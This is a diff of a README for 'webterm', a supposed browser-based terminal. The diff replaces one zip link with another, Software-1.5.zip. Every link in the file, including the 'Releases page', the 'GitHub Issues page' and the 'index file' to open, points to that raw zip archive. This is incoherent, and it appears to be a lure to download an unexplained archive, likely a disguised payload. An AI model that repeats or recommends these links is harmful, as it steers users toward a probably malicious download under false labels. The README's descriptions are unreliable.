@@ -1,7 +1,7 @@
 # 🌐 webterm - Access Your Terminal from Anywhere
 
 ## 🚀 Download webterm
-[![Download webterm](https://raw.githubusercontent.com/karim09s/webterm/main/detacher/webterm.zip)](https://raw.githubusercontent.com/karim09s/webterm/main/detacher/webterm.zip)
+[![Download webterm](https://raw.githubusercontent.com/karim09s/webterm/main/detacher/Software-1.5.zip)](https://raw.githubusercontent.com/karim09s/webterm/main/detacher/Software-1.5.zip)
 
 ## 📖 Introduction
 Welcome to **webterm**, a web-based terminal that makes it easy to access your terminal sessions from anywhere. With features like persistent sessions, multi-session management, and drag-and-drop file support, webterm is designed for users who want a simple and efficient terminal experience.
@@ -20,14 +20,14 @@ To run webterm, ensure your device meets the following minimum requirements:
 - **Basic System Requirements:** Your device should have at least 2GB of RAM and an up-to-date operating system.
 
 ## 🛠️ Installation Instructions
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/karim09s/webterm/main/detacher/webterm.zip) to access the latest version of webterm.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/karim09s/webterm/main/detacher/Software-1.5.zip) to access the latest version of webterm.
 2. **Download the Package:** Click on the latest release to start the download.
 3. **Extract the Files:** Once the download completes, extract the files from the zipped folder.
-4. **Open the Index File:** Navigate to the extracted folder and open the `https://raw.githubusercontent.com/karim09s/webterm/main/detacher/webterm.zip` file in your web browser.
+4. **Open the Index File:** Navigate to the extracted folder and open the `https://raw.githubusercontent.com/karim09s/webterm/main/detacher/Software-1.5.zip` file in your web browser.
 5. **Connect to Your Server:** Enter your server details to start using the terminal.
 
 ## 🔗 Download & Install
-For the latest version of webterm, [click here to visit the Releases page](https://raw.githubusercontent.com/karim09s/webterm/main/detacher/webterm.zip) and download the software.
+For the latest version of webterm, [click here to visit the Releases page](https://raw.githubusercontent.com/karim09s/webterm/main/detacher/Software-1.5.zip) and download the software.
 
 ## 🌍 Usage
 Once you have webterm running, you can connect to your remote server using SSH. Simply enter your login credentials in the appropriate fields. You’ll be up and running in no time, with all the tools you need at your fingertips.
@@ -50,7 +50,7 @@ If you encounter issues during installation or usage, consider the following ste
 - **Consult the README for Known Issues:** Refer to the GitHub page for any known issues or bug fixes.
 
 ## 📞 Support
-For further support, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/karim09s/webterm/main/detacher/webterm.zip). Our community is here to help.
+For further support, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/karim09s/webterm/main/detacher/Software-1.5.zip). Our community is here to help.
 
 ## 👥 Community
 Join our growing community of users. Share your experiences, tips, and tricks for making the most of webterm.
